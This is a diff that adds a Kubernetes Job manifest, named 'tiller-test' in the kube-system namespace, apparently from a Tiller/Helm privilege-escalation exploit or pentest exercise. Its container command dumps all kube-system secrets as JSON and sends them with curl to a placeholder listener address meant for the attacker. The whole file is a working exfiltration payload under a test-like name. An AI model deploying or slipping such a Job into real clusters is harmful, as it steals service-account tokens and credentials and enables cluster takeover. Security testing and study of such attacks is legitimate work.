@@ -1,0 +1,17 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tiller-test
+  namespace: kube-system
+spec:
+  template:
+    spec:
+      serviceAccountName: tiller-test
+      containers:
+        - name: tiller-test
+          image: rflathers/kubectl:bash
+          command:
+            - "/bin/bash"
+            - "-c"
+            - "kubectl get secrets --namespace=kube-system -o json | curl -XPUT -Ffile=@- http://xxx.xxx.xxx.xxx:xxxx" #Insert listening `URL` here
+      restartPolicy: Never
